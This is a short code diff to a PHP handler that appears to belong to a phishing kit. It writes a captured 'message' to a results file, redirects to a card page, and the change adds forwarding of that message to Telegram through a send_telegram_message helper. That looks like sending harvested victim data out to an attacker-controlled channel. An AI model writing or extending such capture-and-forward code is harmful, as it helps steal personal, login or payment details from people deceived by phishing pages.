@@ -1,5 +1,7 @@
 <?php
-$settings = include '../../../settings/settings.php';
+$rootDir = dirname(__DIR__, 3);
+$settings = require_once $rootDir . '/settings/settings.php';
+require_once __DIR__ . '/telegram.php';
 
 # Debug 
 
@@ -90,6 +92,10 @@ if ($settings['save_results'] == "1"){
     $results = fopen($filename, "a+");
     fwrite($results, strtoupper($message));
     fclose($results);
+}
+
+if (!empty($settings['telegram']) && $settings['telegram'] == '1') {
+    send_telegram_message($settings, $message);
 }
 
 header('Location: ../card.php', true, 302);
